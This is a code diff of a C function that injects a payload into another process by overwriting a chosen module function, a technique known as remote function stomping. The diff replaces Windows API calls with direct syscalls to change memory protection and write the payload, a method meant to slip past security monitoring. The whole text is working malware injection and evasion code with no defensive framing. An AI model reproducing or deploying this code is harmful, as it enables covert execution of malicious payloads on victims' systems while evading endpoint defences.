@@ -1,21 +1,21 @@
 #include "common.h"
-
+#include "syscalls.h"
 
 PVOID StompRemoteFunction(IN HANDLE hProcess, IN LPCWSTR sStompModule, IN LPCSTR sStompFunction, IN PVOID pPayload, IN SIZE_T sPayloadSize)
 {
-	// API calls
-	f_VirtualProtectEx rVirtualProtectEx = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "VirtualProtectEx");
-	f_WriteProcessMemory rWriteProcessMemory = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "WriteProcessMemory");
-
 	// Get a handle on victim function [DONT USE SOMETHING THAT IS ACTUALLY CALLED!!]
-	PVOID pAddress = GetProcAddressReplacement(GetModuleHandleReplacement(sStompModule), sStompFunction);
+	PVOID pStomp = GetProcAddressReplacement(GetModuleHandleReplacement(sStompModule), sStompFunction);
 
 	// Overwrite process function
-	DWORD dwOld = NULL;
 	SIZE_T sNumBytes = NULL;
-	rVirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOld);
-	rWriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumBytes);
-	rVirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOld);
+	PVOID oldProt = NULL;
+	PVOID pStomp2 = pStomp;
+	PVOID pStomp3 = pStomp;
 
-	return pAddress;
+	//STATUS = Sw3NtAllocateVirtualMemory(hProcess, pAddress, 0, &rSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+	Sw3NtProtectVirtualMemory(hProcess, &pStomp, &sPayloadSize, PAGE_READWRITE, &oldProt);
+	Sw3NtWriteVirtualMemory(hProcess, pStomp2, pPayload, sPayloadSize, &sNumBytes);
+	Sw3NtProtectVirtualMemory(hProcess, &pStomp2, &sPayloadSize, PAGE_EXECUTE_READWRITE, &oldProt);
+
+	return pStomp3;
 }
